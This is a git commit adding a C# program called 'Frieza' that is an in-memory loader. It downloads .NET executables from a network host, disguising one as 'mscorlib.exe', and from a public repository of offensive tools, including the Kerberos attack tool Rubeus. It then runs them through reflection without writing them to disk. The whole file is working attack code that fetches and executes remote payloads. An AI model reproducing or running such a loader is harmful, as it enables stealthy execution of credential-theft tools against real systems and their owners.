b7ff588ffa8a96506dcada2fcc4567fbf8836f86
Jongtek-23 <72738269+Jongtek-23@users.noreply.github.com>
2022-04-19 09:01:47 +0200

    Add files via upload

---
+++ Frieza.cs
@@ -0,0 +1,66 @@
+﻿using System;
+using System.Net;
+using System.Reflection;
+using System.Threading;
+
+namespace Frieza
+{
+    internal class Program
+    {
+        static void ReflectionFromWeb(string url, int retrycount, int timeoutTimer)
+        {
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            WebClient client = new WebClient();
+            byte[] programBytes = null;
+            while (retrycount >= 0 && programBytes == null)
+            {
+                try
+                {
+                    programBytes = client.DownloadData(url);
+                }
+                catch (WebException ex)
+                {
+                    Console.WriteLine("Assembly not found yet. Sleeping for {0} sec ans retrying another {1} times(s)...", timeoutTimer, retrycount);
+                    retrycount--;
+                    Thread.Sleep(timeoutTimer * 1000);
+                }
+            }
+            if (programBytes == null)
+            {
+                Console.WriteLine("Assembly not found, exiting now ...");
+                Environment.Exit(-1);
+            }
+            Assembly dotnetProgram = Assembly.Load(programBytes);
+            object[] parameters = new string[] { null };
+            dotnetProgram.EntryPoint.Invoke(null, parameters);
+        }
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                Console.WriteLine("Hit a key");
+                Console.ReadKey();
+                ReflectionFromWeb("http://192.168.96.129/mscorlib.exe", 0, 0);
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Console.WriteLine("Could not load mscorlib , exit...");
+                Environment.Exit(-1);
+            }
+
+            try
+            {
+                ReflectionFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
+                Console.ReadKey();
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Console.ReadKey();
+            }
+            
+        }
+    }
+}
